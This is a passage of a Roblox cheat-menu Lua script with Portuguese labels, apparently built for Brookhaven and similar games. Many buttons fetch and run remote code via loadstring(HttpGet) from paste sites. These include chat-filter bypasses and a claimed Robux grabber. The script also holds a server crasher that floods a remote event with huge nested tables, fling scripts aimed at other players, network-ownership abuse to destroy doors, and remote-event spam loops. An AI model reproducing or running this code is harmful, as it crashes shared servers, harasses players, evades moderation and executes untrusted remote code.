-- Detectar barra de espaço (versão desktop, opcional)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end -- Evitar conflito com outras ações do jogo

    if input.KeyCode == Enum.KeyCode.Space then
        performJump()
    end
end)
  	end    
})

Tab:AddButton({
	Name = "fica igual um anel em volta|RESET PRA FICA NORMAL!",
	Callback = function()
      		print("button pressed")-- Script para criar movimento circular no Roblox

-- Variáveis
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local radius = 10 -- Raio do círculo
local speed = 90 -- Velocidade do movimento

-- Função para calcular o movimento
local function moveInCircle()
    local angle = 0 -- Ângulo inicial
    while true do
        -- Incrementar o ângulo com base na velocidade
        angle = angle + speed * math.rad(1)
        if angle >= math.rad(360) then
            angle = 0 -- Reseta o ângulo após completar o círculo
        end
        
        -- Calcula nova posição
        local x = math.cos(angle) * radius
        local z = math.sin(angle) * radius

        -- Atualiza a posição do personagem
        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X + x, humanoidRootPart.Position.Y, humanoidRootPart.Position.Z + z)

        -- Espera um curto período antes do próximo movimento
        task.wait(0.03)
    end
end

-- Executa o movimento circular
moveInCircle()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



local Tab = Window:MakeTab({
	Name = "MELHORES CHAT BYPASS",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "CHAT V1!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FilterEvader-v1-Chat-Bypass-26225"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "CHAT V2!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Chat-bypass-v2-chatglyph-26394"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "CHAT V3!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-BEST-CHAT-BYPASSER-26306"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "CHAT V4!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gaze-bypass-REIMAGINED-26354"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "chat da buceta bypasser v2",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Chat-Bypasser-V3-24610"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
	Name = "flings potentes💥",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "fling potente criado pro frostzxx7",
	Callback = function()
      		print("button pressed")-- 🌀 SATURNO FLING 🌀
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local isFlingActive = false -- Verifica se o fling está ativo

-- Criar a interface
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.Name = "SaturnoFlingGui"

-- Botão de ativar/desativar Fling
local flingButton = Instance.new("TextButton")
flingButton.Parent = screenGui
flingButton.Size = UDim2.new(0, 150, 0, 50)
flingButton.Position = UDim2.new(0.05, 0, 0.8, 0)
flingButton.Text = "fling ativado"
flingButton.BackgroundColor3 = Color3.fromRGB(295, 0, 82)
flingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
flingButton.Font = Enum.Font.GothamBold
flingButton.TextSize = 18

-- Função para alternar o estado de Fling
local function toggleFling()
    isFlingActive = not isFlingActive
    flingButton.Text = isFlingActive and "🪐Desativar Fling🪐" or "🪐Ativar Fling🪐"
end

-- Função de Fling
local function performFling()
    if isFlingActive then
        -- Força de Fling
        local flingForce = Vector3.new(1000, 2, 910) -- Ajuste a força conforme necessário
        humanoidRootPart.Velocity = flingForce

        -- Rotação para potencializar o efeito
        humanoidRootPart.RotVelocity = Vector3.new(50, 50, 50)
    end
end

-- Conectar eventos
flingButton.MouseButton1Click:Connect(toggleFling)
game:GetService("RunService").RenderStepped:Connect(performFling)
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "F☯︎LING DOS ANÉIS DE SATURNO|ORBIT OF SATURN☯︎",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Orbit-14486"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Section = Tab:AddSection({
    Name = "em breve terá  mais flings"
})

local Tab = Window:MakeTab({
	Name = "Scripts v4🌕",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "copiar avatar|em todos os jogos§ VISUAL💩",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Copy%20Avatar'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script de salvar o servidor aonde você estava antes",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script17")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "SCRIPT DE FE EMOTE",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script19")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script de fingi que está em blocos invisíveis 👽",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script1")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script de fica igual uma bola bolando",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Cannon%20Ball'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script de pegar robux(funciona em pls donate💲)",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/Deadhub0/Pls-donate/refs/heads/main/Script'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
	Name = "Função Brookhaven🪐",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddToggle({
Name = "Toggle Garage Door",
Default = false,
Callback = function(value)
toggleState = value
if toggleState then
toggleGarageDoor()
end
end
})
local Section = Tab:AddSection({
    Name = "Fire Function"
})
Tab:AddButton({
	Name = "Fire On",
	Callback = function()
      	local args = {
    [1] = "PlayerWantsFireOnFirePassNotShowingAnyone"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Fire Off",
	Callback = function()
      	local args = {
    [1] = "PlayerWantsFireOffFirePassNotShowingAnyone"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
  	end    
})

local toggleActive = false
local function repeatRemote()
while toggleActive do
local args = {
[1] = "PlayerWantsFireOnFirePassNotShowingAnyone"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
wait(0.1) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Fire ",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
repeatRemote()
end
end
})

local toggleActive = false
local function repeatRemote()
while toggleActive do
--This is a simple roblox game crasher made by casanova
--Github cfreemepq
--fixed script*

while wait(0.6) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end

local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}

table.insert(spammedtable, {})
z = spammedtable[1]

for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end

local calculatemax = getmaxvalue(tableincrease)
local maximum

if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end

for i = 1, maximum do
     table.insert(maintable, spammedtable)
end

for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end

bomb(250, 2) --// change values if client crashes.
end
wait(0.0) -- intervalo de 1 segundo entre cada repetição
end
end
local Section = Tab:AddSection({
	Name = "Doors"
})
Tab:AddButton({
Name = "DESTROY DOORS",
Callback = function()
local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local NetworkAccess = coroutine.create(function()
    settings().Physics.AllowSleep = false
    while game:GetService("RunService").RenderStepped:Wait() do
        for _, Players in next, game:GetService("Players"):GetPlayers() do
            if Players ~= game:GetService("Players").LocalPlayer then
                Players.MaximumSimulationRadius = 0 
                sethiddenproperty(Players, "SimulationRadius", 0) 
            end 
        end
        game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
        setsimulationradius(math.huge) 
    end 
end) 
coroutine.resume(NetworkAccess)
local function ForcePart(v)
    if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
        Mouse.TargetFilter = v
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(999999, 999999, 999999)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2 
        AlignPosition.Attachment1 = Attachment1
    end
end
for _, v in next, game:GetService("Workspace"):GetDescendants() do
    ForcePart(v)
end
game:GetService("Workspace").DescendantAdded:Connect(function(v)
    ForcePart(v)
end)
UserInputService.InputBegan:Connect(function(Key, Chat)
    if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
    end
end)
spawn(function()
    while game:GetService("RunService").RenderStepped:Wait() do
        Attachment1.WorldCFrame = Updated
    end
end)
end
})
Tab:AddParagraph("How to use","You need to have permission from the person's house and get close to the house.The function will not work if the house is locked, but if you have permission you can unlock it, this function works like the Ice Hub's fling Doors")
Tab:AddParagraph("Como usar","Você precisa ter permissão da casa da pessoa e chegar perto da casa. A função não funcionará se a casa estiver trancada, mas se você tiver permissão, poderá desbloqueá-la.esta função funciona como as portas de lançamento do Ice Hub")
local Section = Tab:AddSection({
	Name = "Get Permission Houses"
})
Tab:AddButton({
	Name = "House 1",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 2",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 2
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 3",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 3
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 4",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 4
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 5",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 5
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 6",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 6
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 7",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 7
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 8",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 8
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 9",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 9
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 10",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 10
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 11",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 11
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 12",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 12
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 13",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 13
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 14",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 14
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 15",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 15
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 16",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 16
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 17",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 17
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 18",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 18
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 19",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 19
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 20",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 20
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 21",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 21
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 22",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 22
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 23",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 23
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})
Tab:AddButton({
	Name = "House 24",
	Callback = function()
      	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 24
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  	end    
})

local Tab = Window:MakeTab({
Name = "🪐Avatar|BROOKHAVEN 🪐",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

-- Variables
local name1 = ""
local name2 = ""
local name3 = ""
local repeatNames = false

-- Textbox for Name 1
Tab:AddTextbox({
Name = "Name 1",
Default = "",
TextDisappear = true,
Callback = function(value)
name1 = value
end
})

-- Textbox for Name 2
Tab:AddTextbox({
Name = "Name 2",
Default = "",
TextDisappear = true,
Callback = function(value)
name2 = value
end
})

-- Textbox for Name 3
Tab:AddTextbox({
Name = "Name 3",
Default = "",
TextDisappear = true,
Callback = function(value)
name3 = value
end
})

-- Toggle for Repeating Names
Tab:AddToggle({
Name = "repetir nomes👹",
Default = false,
Callback = function(value)
repeatNames = value
while repeatNames do
local args1 = {
[1] = "RolePlayName",
[2] = name1
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args1))

local args2 = {
[1] = "RolePlayName",
[2] = name2
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args2))

wait(1) -- Adjust the wait time as needed


local args3 = {
[1] = "RolePlayName",
[2] = name3
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args3))
end
end
})
local Section = Tab:AddSection({
    Name = "Limiteds"
})
local valks = {
["Valk timeless"] = 17517206952,
["Valk esmerald"] = 2830437685,
["Valk Shine Time"] = 1180433861
}

Tab:AddDropdown({
Name = "Select Valks",
Default = "",
Options = {"Valk timeless", "Valk esmerald", "Valk Shine Time"},
Callback = function(selected)
local args = {
[1] = "wear",
[2] = valks[selected]
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})

local dominus = {
["Dominus Frigidus"] = 48545806,
["Dominus Empyreus"] = 64444871,
["Dominus Astra"] = 162067148,
["Dominus Infernus"] = 31101391
}

Tab:AddDropdown({
Name = "Select Dominus",
Default = "",
Options = {"Dominus Frigidus", "Dominus Empyreus", "Dominus Astra", "Dominus Infernus"},
Callback = function(selected)
local args = {
[1] = "wear",
[2] = dominus[selected]
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Characters"
})
local characters = {
["Chef Tordet"] = {
[1] = 3657481497,
[2] = 3657478273,
[3] = 3657474549,
[4] = 3657479706,
[5] = 3745126840,
[6] = 1
},
["Chicken"] = {
[1] = 128157408,
[2] = 128157262,
[3] = 128157213,
[4] = 128157361,
[5] = 128157317,
[6] = 1
},
["Gang potato"] = {
[1] = 5392155773,
[2] = 5392150804,
[3] = 5392146467,
[4] = 5392152751,
[5] = 5392148570,
[6] = 1
},
["The overser"] = {
[1] = 81725326,
[2] = 81725366,
[3] = 81725392,
[4] = 1,
[5] = 1,
[6] = 1
},
["All korblox"] = {
[1] = 139607770,
[2] = 139607625,
[3] = 139607570,
[4] = 139607718,
[5] = 139607673,
[6] = 1
}
}

Tab:AddDropdown({
Name = "Characters",
Default = "",
Options = {"Chef Tordet", "Chicken", "Gang potato", "The overser", "All korblox"},
Callback = function(selected)
local args = {
[1] = "CharacterChange",
[2] = characters[selected],
[3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
end
})


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function copyAvatar(targetPlayer)
if targetPlayer and targetPlayer.Character and LocalPlayer.Character then
for _, v in pairs(LocalPlayer.Character:GetChildren()) do
if v:IsA("Accessory") or v:IsA("Clothing") or v:IsA("BodyColors") or v:IsA("CharacterMesh") or v:IsA("ShirtGraphic") then
v:Destroy()
end
end

for _, v in pairs(targetPlayer.Character:GetChildren()) do
if v:IsA("Accessory") or v:IsA("Clothing") or v:IsA("BodyColors") or v:IsA("CharacterMesh") or v:IsA("ShirtGraphic") then
v:Clone().Parent = LocalPlayer.Character
end
end

LocalPlayer.Character.Humanoid:ApplyDescription(targetPlayer.Character.Humanoid:GetAppliedDescription())
end
end

Tab:AddTextbox({
Name = "Player Name {Copy Avatar}",
Default = "",
TextDisappear = true,
Callback = function(value)
local targetPlayer = Players:FindFirstChild(value)
if targetPlayer then
copyAvatar(targetPlayer)
else
print("Player not found")
end
end
})
local Section = Tab:AddSection({
    Name = "Bold animatiom"
})
Tab:AddButton({
	Name = "Idle",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744209868
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Run",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744214662
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Walk",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744219182
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Jump",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744212581
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Fall",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744207822
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Climb",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744204409
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "swim", 
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744217055
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Head"
})
Tab:AddButton({
	Name = "Headless",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 134082579
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Cheek",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 746767604
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Horror Skin"
})
Tab:AddButton({
	Name = "Michael Myers",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 15133320948
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Mario Victim 1",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 14732524763
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Scary",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 15036977826
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Scary dog",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 14761007249
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Jeff The Killer",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 14502327402
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Korblox Legs "
})
Tab:AddButton({
	Name = "Right",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Left ",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 139607673,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Ice legs "
})
Tab:AddButton({
	Name = "Right",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139572888,
        [5] = 1,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Left ",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 139572789,
        [6] = 1
    },
